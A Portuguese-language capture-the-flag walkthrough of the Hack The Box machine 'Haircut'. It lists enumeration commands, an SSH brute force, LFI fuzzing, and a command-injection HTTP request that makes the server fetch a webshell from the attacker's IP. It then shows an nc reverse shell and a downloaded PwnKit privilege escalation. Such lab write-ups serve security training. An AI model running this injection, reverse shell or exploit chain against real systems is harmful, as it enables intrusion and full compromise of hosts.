Haircut
========================

    sudo nmap_enum 10.10.10.24 | tee nmap_output.txt

![qownnotes-media-lmTfGN](../../../media/qownnotes-media-lmTfGN.png)


    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn 10.10.10.24 | tee nmap_udp_output.txt
![qownnotes-media-RhUXGg](../../../media/qownnotes-media-RhUXGg.png)

    sudo nmap -p- -Pn -T5 -n 10.10.10.24 | tee nmap_fullportstcp_output.txt

![qownnotes-media-ZrRaGl](../../../media/qownnotes-media-ZrRaGl.png)

    sudo nmap -sS --script vuln -n -T5 -Pn 10.10.10.24 -p 22,80 | tee nmap_vulns.txt

![qownnotes-media-qcMlPQ](../../../media/qownnotes-media-qcMlPQ.png)

    nikto -host http://10.10.10.24 -T x 6 | tee nikto_output.txt

![qownnotes-media-gQDALY](../../../media/qownnotes-media-gQDALY.png)


Verificar comentarios nas páginas

Outros dominios

    ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: haircut.FUZZ" -u http://haircut.htb -fs 144

![qownnotes-media-IWFDFe](../../../media/qownnotes-media-IWFDFe.png)

Subdominio
    
    ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.haircut.htb" -u http://haircut.htb -fs 144

![qownnotes-media-CJrArX](../../../media/qownnotes-media-CJrArX.png)

Procurar directories

    gobuster dir -u http://haircut.htb/uploads -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -k -t 16 -o "tcp_port_protocol_ext_gobuster.txt"

![qownnotes-media-KTHmgU](../../../media/qownnotes-media-KTHmgU.png)

Procurar admin console/directories

    gobuster dir -u http://10.10.10.24 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 16 -o "tcp_port_protocol_gobuster.txt"

![qownnotes-media-fYWQNJ](../../../media/qownnotes-media-fYWQNJ.png)

Procurar admin console/directories

    gobuster dir -u http://10.10.10.24 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -k -t 16 -o "tcp_port_protocol_ext_gobuster.txt"

![qownnotes-media-JgPUpp](../../../media/qownnotes-media-JgPUpp.png)

    gobuster dir -u http://10.10.10.24 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -k -t 16 -o "tcp_port_protocol_gobuster.txt"

## Exploitation

Directory traversal

    ffuf -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http://haircut.htb/exposed.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://haircut.htb' -H 'Connection: keep-alive' -H 'Referer: http://haircut.htb/exposed.php' -H 'Upgrade-Insecure-Requests: 1' -d 'formurl=http%3A%2F%2Flocalhost%2FFUZZ&submit=Go' -fs 508,966 -x http://127.0.0.1:8080

![qownnotes-media-AHwKap](../../../media/qownnotes-media-AHwKap.png)

Obtive o nome de usuários do servidor

    hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt 10.10.10.24 ssh

    ffuf -c -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u 'http://haircut.htb/exposed.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://haircut.htb' -H 'Connection: keep-alive' -H 'Referer: http://haircut.htb/exposed.php' -H 'Upgrade-Insecure-Requests: 1' -d 'formurl=http%3A%2F%2Flocalhost%2F/test.html FUZZ&submit=Go' -fs 1037 -x http://127.0.0.1:8080
 
 Cara, nada disso estava funcionando. Então, levando em conta que o comando no servidor seria mais ou menos isso:
 
     system('curl' . $_POST['formurl'] . '/some/direcoty');

podemos encaixar um command injection aqui:

    -o%20uploads%2Fshell.php

No intuito de salvar o resultado do curl no diretório /uploads/arq_to_save.php. Logo ficou da seguinte forma:

```
POST /exposed.php HTTP/1.1
Host: haircut.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Content-Length: 83
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5
Connection: close
Content-Type: application/x-www-form-urlencoded
Origin: http://haircut.htb
Referer: http://haircut.htb/exposed.php
Upgrade-Insecure-Requests: 1

formurl=http%3A%2F%2F10.10.14.7%2Fwebshell.php%20-o%20uploads%2Fshell.php&submit=Go
```

![qownnotes-media-CVqRmN](../../../media/qownnotes-media-CVqRmN.png)


    curl http://haircut.htb/uploads/shell.php?cmd=nc -e /bin/bash 10.10.14.7 8081
    nc -nlvp 8081
 
 ![qownnotes-media-ZvNord](../../../media/qownnotes-media-ZvNord.png)

## Privilege Escalation

    python3 -c 'import pty; pty.spawn("/bin/bash")'
    export TERM=xterm
    <CTRL +Z>
    stty raw -echo; fg
    
    uname -a
    cat /proc/version
    curl http://10.10.14.7:8000/PwnKit_comp -o pwnkit
    chmod +x pwnkit
    ./pwnkit

![qownnotes-media-eyfZKL](../../../media/qownnotes-media-eyfZKL.png)


![qownnotes-media-uMYTdR](../../../media/qownnotes-media-uMYTdR.png)

